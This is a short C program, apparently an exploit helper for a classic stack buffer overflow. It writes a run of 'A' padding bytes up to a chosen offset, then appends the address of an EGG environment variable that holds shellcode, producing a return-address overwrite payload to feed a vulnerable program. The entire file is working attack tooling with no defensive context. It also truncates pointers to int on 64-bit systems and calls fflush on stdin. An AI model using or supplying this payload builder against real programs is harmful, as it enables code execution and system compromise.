#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FILL 'A'
#define EGG "EGG"

void usage(char *basename) {
  fprintf(stderr, "usage: %s [-h] offset\n", basename);
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    if (argc < 1) {
      usage("overflow");
    }
    else {
      usage(argv[0]);
    }
    return 255;
  }

  if (strcmp(argv[1], "-h") == 0) {
    usage(argv[0]);
    return 0;
  }

  char *egg = getenv(EGG);
  if (egg == NULL) {
    fprintf(stderr, "No variable $%s defined in environment\n", EGG);
    return 1;
  }
  int egg_addr = (int) egg;

  int offset = atoi(argv[1]);

  char *buffer = malloc((offset + 4 + 1) * sizeof(char));
  if (buffer == NULL) {
    fprintf(stderr, "Error allocating space for buffer");
    return 2;
  }

  memset(buffer, FILL, offset);
  int i;
  for (i = 0; i < 4; i++) {
    buffer[offset + i] = (char) (egg_addr >> (i * 8));
  }
  buffer[offset + 4] = '\0';

  printf("%s", buffer);
  fflush(stdin);

  free(buffer);
  return 0;
}
